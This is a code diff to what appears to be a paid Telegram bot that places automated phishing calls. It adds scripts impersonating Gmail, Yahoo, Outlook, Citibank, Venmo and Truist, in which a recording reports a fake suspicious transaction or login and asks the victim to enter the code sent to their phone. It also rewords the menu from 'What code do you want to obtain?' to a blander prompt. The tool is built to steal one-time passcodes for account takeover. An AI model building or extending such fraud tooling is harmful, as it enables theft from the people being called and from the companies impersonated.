@@ -98,7 +98,13 @@ EMPRESAS = {
     "ebay":      {"nombre": "eBay",            "emoji": "🛒", "mensaje": "Hello, this is eBay. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
     "google":    {"nombre": "Google",          "emoji": "🔵", "mensaje": "Hello, this is Google. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
     "wellsfargo":{"nombre": "Wells Fargo",     "emoji": "🏦", "mensaje": "Hello, this is Wells Fargo. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "gmail":     {"nombre": "Gmail",           "emoji": "📧", "mensaje": "Hello, this is Google Gmail. We have detected an unauthorized access attempt on your email account. If this was not you, press 1. To block the access, enter the code we sent to your phone number."},
+    "yahoo":     {"nombre": "Yahoo",           "emoji": "🟣", "mensaje": "Hello, this is Yahoo. We have detected an unauthorized access attempt on your email account. If this was not you, press 1. To block the access, enter the code we sent to your phone number."},
     "bofa":      {"nombre": "Bank of America", "emoji": "🏦", "mensaje": "Hello, this is Bank of America. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "citibank":  {"nombre": "Citibank",        "emoji": "🏦", "mensaje": "Hello, this is Citibank. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "venmo":     {"nombre": "Venmo",           "emoji": "💙", "mensaje": "Hello, this is Venmo. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "truist":    {"nombre": "Truist Bank",     "emoji": "🟣", "mensaje": "Hello, this is Truist Bank. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "outlook":   {"nombre": "Outlook",         "emoji": "📨", "mensaje": "Hello, this is Microsoft Outlook. We have detected an unauthorized access attempt on your email account. If this was not you, press 1. To block the access, enter the code we sent to your phone number."},
 }
 
 IVR_OPCIONES = {
@@ -423,7 +429,7 @@ TEXTOS = {
             "💼 *Planes*\n🥉 1 Día — $35\n🥈 3 Días — $79\n"
             "🥇 1 Semana — $129\n👑 1 Mes — $299\n\nContacta: @heavyhittersrd"
         ),
-        "empresa": "🏢 *¿Que codigo quieres obtener?*",
+        "empresa": "🏢 *¿Qué empresa representas?*",
         "empresa_sel": "seleccionada\n\n📱 Escribe el número a llamar:\n`+13023451233`",
         "usa_menu": "Usa el menú.",
     },
@@ -458,7 +464,7 @@ TEXTOS = {
             "💼 *Plans*\n🥉 1 Day — $35\n🥈 3 Days — $79\n"
             "🥇 1 Week — $129\n👑 1 Month — $299\n\nContact: @heavyhittersrd"
         ),
-        "empresa": "🏢 *What code do you want to obtain?*",
+        "empresa": "🏢 *Which company do you represent?*",
         "empresa_sel": "selected\n\n📱 Enter the number to call:\n`+13023451233`",
         "usa_menu": "Use the menu.",
     }
@@ -598,6 +604,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
              InlineKeyboardButton("🔵 Google", callback_data="empresa|google")],
             [InlineKeyboardButton("🏦 Wells Fargo", callback_data="empresa|wellsfargo"),
              InlineKeyboardButton("🏦 Bank of America", callback_data="empresa|bofa")],
+            [InlineKeyboardButton("🟣 Yahoo", callback_data="empresa|yahoo"),
+             InlineKeyboardButton("📧 Gmail", callback_data="empresa|gmail")],
+            [InlineKeyboardButton("🏦 Citibank", callback_data="empresa|citibank"),
+             InlineKeyboardButton("💙 Venmo", callback_data="empresa|venmo")],
+            [InlineKeyboardButton("🟣 Truist Bank", callback_data="empresa|truist"),
+             InlineKeyboardButton("📨 Outlook", callback_data="empresa|outlook")],
         ]
         await update.message.reply_text(
             t(context, "empresa"),
